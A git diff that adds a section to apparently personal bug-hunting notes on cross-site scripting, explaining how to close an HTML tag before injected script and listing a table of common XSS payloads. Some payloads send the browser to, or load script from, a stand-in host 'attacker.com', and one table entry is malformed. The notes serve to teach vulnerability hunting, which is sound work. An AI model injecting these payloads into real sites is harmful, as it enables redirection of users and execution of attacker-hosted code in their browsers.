@@ -276,4 +276,35 @@ A site might allow a user to load an image by using a URL and use it as their pr
 There is more information on ways to execute JS code to bypass XSS protection, different browsers also support different tags and event handlers.
 Always test by using multiple XSS browsers when hunting for XSS.
 ###### Closing Out HTML Tags
-#### Step 3
+Its required to close the previous HTML tag before starting a new one to avoid causing an syntax error. 
+If you don't the browser will not correctly interpret the payload. 
+
+```html
+<img src="USER_INPUT">
+```
+
+To close out the tag the payload has to include the ending of an `<img>` tag before the javascript
+
+```html
+"/><script>location="http://attacker.com";</script>
+```
+
+The resulting injection will appear as
+
+```html
+<img src=""/><script>location="http://attacker.com";</script>">
+```
+
+This payload closes the string that was to contain the user input, then it closes the `<img>` tag, the payload injects a complete string after the `<img>` tag.
+You can inspect the source code, look for unclosed tags or syntax errors.
+Check your browsers console and see if there are any errors loading the page. 
+###### Common XSS Payload
+| Payload                               | Purpose                                                                                                                          |
+| ------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
+| `<script>alert(1)</script>`           | Most generic XSS payload, generates a pop up box if successful                                                                   |
+| `<iframe src=javascript:alert(1)>`    | Loads javascript code in an iframe, useful when script tags are banned by the XSS filter                                         |
+| `<body onload=alert(1)>`              | Useful when input strings cant contain the term script, inserts an HTML element that runs Javascript code when its loaded        |
+| `"><img src=x onerror=prompt(1);>`    | Closes out the previous tag, it injects an image tag with an invalid src URL. When the tag fails to load it will run the payload |
+| `<script>alert(1)<!-`                 | This payload will comment out the rest of the line in the HTML doc to prevent syntax errors                                      |
+| `<a onmouseover"alert(1)">test</a>`   | Inserts a link that will cause Javascript to run after user hovers over the link                                                 |
+| `<script src=//attacker.com/test.js`> | Causes the browser to load and run an external script hosted on the attackers server                                             |
